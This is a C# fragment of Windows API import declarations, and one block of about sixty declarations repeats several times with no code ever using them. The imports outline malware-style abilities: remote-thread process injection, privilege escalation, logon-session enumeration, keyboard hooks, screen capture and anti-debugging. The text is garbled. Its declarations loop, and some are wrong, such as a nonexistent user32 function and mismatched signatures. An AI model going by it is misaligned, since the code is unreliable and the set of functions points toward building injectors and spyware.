        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);